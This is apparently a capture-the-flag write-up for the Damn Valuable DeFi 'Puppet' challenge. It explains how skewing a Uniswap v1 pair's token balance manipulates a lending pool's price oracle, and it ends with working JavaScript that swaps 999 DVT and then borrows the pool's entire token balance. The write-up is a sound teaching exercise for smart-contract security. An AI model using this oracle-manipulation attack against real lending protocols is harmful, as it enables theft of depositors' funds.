# Puppet

## Challenge

There's a huge lending pool borrowing Damn Valuable Tokens (DVTs), where you first need to deposit twice the borrow amount in ETH as collateral. The pool currently has 100000 DVTs in liquidity.

There's a DVT market opened in an Uniswap v1 exchange, currently with 10 ETH and 10 DVT in liquidity.

Starting with 25 ETH and 1000 DVTs in balance, you must steal all tokens from the lending pool.

## Solution

Let us see how the borrowing mechanism work

The idea here is to exploit the AMM model of Uniswap v1, that is

```solidity
function borrow(uint256 borrowAmount) public payable nonReentrant {
        uint256 depositRequired = calculateDepositRequired(borrowAmount);
        // ...
}
```

It first asks the required collateral deposit in ETH, by calling the `calculateDepositRequired` function, that is

```solidity
function calculateDepositRequired(uint256 amount) public view returns (uint256) {
    return amount * _computeOraclePrice() * 2 / 10 ** 18;
}
```

This function calls the `_computeOraclePrice` function below

```solidity
function _computeOraclePrice() private view returns (uint256) {
    // calculates the price of the token in wei according to Uniswap pair
    return uniswapPair.balance * (10 ** 18) / token.balanceOf(uniswapPair);
}
```

This means that in order to obtain a huge loan with a little collateral, we could manipulate the prices in the oracle, that in this case is a Uniswap pair DVT/ETH. If the amount of DVT token in the Uniswap Exchange DVT/ETH is huge compared to the ETH balance, then `_computeOraclePrice()` will be small, and with a small amount of ETH we will be able to take all the DVT tokens of the pool. If we do the math, to borrow 100000 DVT for 25ETH would mean that the amount of DVT in the exchange is at least 100000 \* 2 /25 = 8000 times higher than the ETH balance of the pool.

Making a swap of 999 DVT for ETH, will leave the Exchange with 1009 DVT and aproximately 0,0994 ETH which gives a ratio of more than 10000, enough to perform the attack. To optimise the attack we would need to know which token has more value to us, and then calculate the output price of the pair after doing the swap.

We implement the attack on the file [`puppet.challenge.js`](../../test/puppet/puppet.challenge.js), which we completed with the following code.

```javascript
it("Exploit", async function () {
  /** CODE YOUR EXPLOIT HERE  */
  await this.token.connect(attacker).approve(
    this.uniswapExchange.address,
    ethers.utils.parseEther("999") // We keep 1 token to validate the tests
  )

  await this.uniswapExchange.connect(attacker).tokenToEthSwapInput(
    ethers.utils.parseEther("999"),
    1,
    (await ethers.provider.getBlock("latest")).timestamp * 2 //deadline
  )

  await this.lendingPool
    .connect(attacker)
    .borrow(POOL_INITIAL_TOKEN_BALANCE, { value: ATTACKER_INITIAL_ETH_BALANCE })
})
```
